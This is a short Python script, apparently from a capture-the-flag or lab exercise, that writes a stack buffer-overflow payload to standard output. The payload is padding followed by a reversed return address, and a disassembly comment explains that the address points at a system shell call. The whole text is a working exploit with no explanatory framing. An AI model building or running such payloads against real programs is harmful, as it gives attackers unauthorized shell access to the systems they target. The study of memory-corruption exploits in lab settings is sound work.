 # 65d:	c7 04 24 9b 07 00 00 	movl   $0x79b,(%esp) // we want to return into 
#0x56555664 system shell call
import sys
payload = b"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBCCCCDDDDEEEE"
payload+=b"\x56\x55\x56\x64"[::-1]
sys.stdout.buffer.write(payload)








